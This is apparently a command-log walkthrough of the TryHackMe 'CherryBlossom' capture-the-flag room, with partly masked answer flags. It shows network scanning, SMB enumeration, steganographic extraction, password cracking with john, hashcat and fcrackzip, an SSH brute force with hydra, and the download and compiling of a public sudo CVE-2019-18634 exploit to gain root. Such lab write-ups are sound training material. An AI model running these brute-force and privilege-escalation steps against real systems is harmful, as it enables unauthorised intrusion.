...
```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ sudo nmap -A -sS -sC -sV -O 10.10.164.126
...
```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ sudo nmap --script smb-enum-shares -vv  10.10.164.126
...
```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ cat journal.txt | base64 -d > output
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ file output
output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ stegpy output
File _journal.zip succesfully extracted from output
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ unzip _journal.zip
Archive:  _journal.zip
file #1:  bad zipfile offset (local header sig):  0
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ file _journal.zip
_journal.zip: JPEG image data
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ hexeditor _journal.zip
```

`50 4B 03 04`

```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ fcrackzip -uDp /usr/share/wordlists/rockyou.txt _journal2.zip
...
```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ john --wordlist=/usr/share/wordlists/rockyou.txt Journal.hash
...
THM{V0N318*****054a8f1db7618f8f6a41a0b3349baa11}
```

```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ hydra -l lily -P cherry-blossom.list ssh://10.10.164.126
...
```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ hashcat -m1800 -a0 --force johan.hash cherry-blossom.list
...
THM{V0N318*****cb064113d54e24dc84f26b1f63bf3098}
```

```
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/master/exploit.c
...
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ gcc -o exploit exploit.c
bibo318@parrot:~/CTFs/tryhackme/CherryBlossom$ scp exploit lily@10.10.164.126:/tmp
...
root
# cat /root/root.txt
THM{V0N318*****d4b5e228a567288d12e301f2f0bf5be0}
```

1. Journal Flag

`THM{V0N318*****054a8f1db7618f8f6a41a0b3349baa1112**123:))}`

2. User Flag

`THM{V0N318*****cb064113d54e24dc84f26b1f63bf309812**123:))}`

3. Root Flag

`THM{V0N318*****d4b5e228a567288d12e301f2f0bf5be012**123:))}`
